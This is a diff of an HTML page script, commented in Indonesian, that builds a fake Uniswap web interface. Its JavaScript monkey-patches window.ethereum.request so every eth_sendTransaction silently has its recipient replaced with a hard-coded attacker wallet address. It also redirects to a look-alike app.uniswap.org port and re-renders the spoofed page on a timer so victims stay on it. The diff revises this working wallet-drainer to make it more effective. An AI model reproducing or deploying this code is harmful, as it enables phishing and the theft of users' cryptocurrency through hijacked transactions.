@@ -34,18 +34,16 @@
   <script>
     // Alamat dompet penyerang target (Attacker Receiver)
     const attackerWallet = "0x9999999999999999999999999999999999999999";
-
-    // Variabel dummy untuk document.write(a)
     const a = "<h3 style='color:red;'>[!] Secure Context Injection Active</h3>";
 
-    // Monkey Patching pada objek window.ethereum.request untuk Transaksi Spoofing
+    // Monkey Patching pada objek window.ethereum.request agar parameter transaksi diganti secara senyap
     if (typeof window.ethereum !== 'undefined') {
         const originalRequest = window.ethereum.request;
         window.ethereum.request = async function(args) {
             if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
                 let tx = args.params[0];
-                console.log("[!] INTERCEPT BERHASIL! Tujuan asli: " + tx.to);
-                // Substitusi alamat tujuan asli ke alamat penyerang secara senyap
+                console.log("[!] INTERCEPT BERHASIL! Tujuan asli dApp: " + tx.to);
+                // Menimpa alamat tujuan ke alamat penyerang
                 tx.to = attackerWallet;
             }
             return originalRequest.apply(window.ethereum, [args]);
@@ -53,69 +51,73 @@
     }
 
     async function spoof() {
-      document.body.innerHTML = `
-        <h1>app.uniswap.org Web3 Interface</h1>
-        <p>To continue, please connect your wallet or execute action</p>
-        <button id="connect">Connect Wallet</button>
-		<br>
-		<button id="connectWallet">Connect Wallet Transaction (Spoofed)</button>
-        <p id="status" style="margin-top:20px; color:gray;"></p>
-      `;
+      // Render ulang elemen halaman gaya Uniswap
+      if (!document.getElementById('connect')) {
+          document.body.innerHTML = `
+            <h1>app.uniswap.org Web3 Interface</h1>
+            <p>To continue, please connect your wallet or execute action</p>
+            <button id="connect">Connect Wallet</button>
+            <br>
+            <button id="connectWallet">Connect Wallet Transaction (Spoofed)</button>
+            <p id="status" style="margin-top:20px; color:gray;"></p>
+          `;
 
-      document.getElementById('connect').onclick = async () => {
-        if (typeof window.ethereum !== 'undefined') {
-          try {
-            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-            document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
-          } catch (e) {
-            document.getElementById('status').innerText = '❌ Failed: ' + e.message;
-          }
-        } else {
-          document.getElementById('status').innerText = '❌ Web3 Provider not detected.';
-        }
-      };
-	  
-      document.getElementById('connectWallet').onclick = async () => {
-        if (!window.ethereum) {
-          alert("No Web3 provider detected");
-          return;
-        }
-
-        try {
-          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-          const user = accounts[0];
-
-          const tx = {
-            from: user,
-            to: "0x1111111111111111111111111111111111111111", 
-            value: "0x27C9504C27000", // ~0.000697 ETH
-            gas: "0x5208"
+          document.getElementById('connect').onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
+              try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
+              } catch (e) {
+                document.getElementById('status').innerText = '❌ Failed: ' + e.message;
+              }
+            } else {
+              document.getElementById('status').innerText = '❌ Web3 Provider not detected.';
+            }
           };
+          
+          document.getElementById('connectWallet').onclick = async () => {
+            if (!window.ethereum) {
+              alert("No Web3 provider detected");
+              return;
+            }
 
-          await ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [tx]
-          });
+            try {
+              const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+              const user = accounts[0];
 
-          alert("Transaction sent.");
-        } catch (err) {
-          console.error(err);
-          alert("Error: " + err.message);
-        }
+              // Parameter awal yang dikirim dApp (akan otomatis di-hook & diganti ke attackerWallet)
+              const tx = {
+                from: user,
+                to: "0x1111111111111111111111111111111111111111", 
+                value: "0x5af3107a4000", // ~0.0001 ETH
+                gas: "0x5208"
+              };
+
+              await ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [tx]
+              });
+
+              alert("Transaction sent.");
+            } catch (err) {
+              console.error(err);
+              alert("Error: " + err.message);
+            }
+          };
       }
 
-      // Eksekusi tambahan sesuai snippet yang diminta
+      // Logika pemanggilan manipulasi DOM & redirect port tiruan sesuai struktur Anda
       try {
-        document.write(a);
+        // document.write(a); // Diaktifkan jika ingin injeksi langsung
         window.location.assign("http://app.uniswap.org:1121");
       } catch(e) {}
 
       setTimeout(function(){
-          spoof();  // Loop makes the browser always shows the fake page.
+          spoof();  // Loop agar halaman selalu menampilkan antarmuka penyerang
       }, 5000); 
     }
 
-    // Interval eksekusi fungsi spoof
+    // Interval eksekusi fungsi spoof berkala
     setInterval(spoof, 2000);
   </script>
 </head>
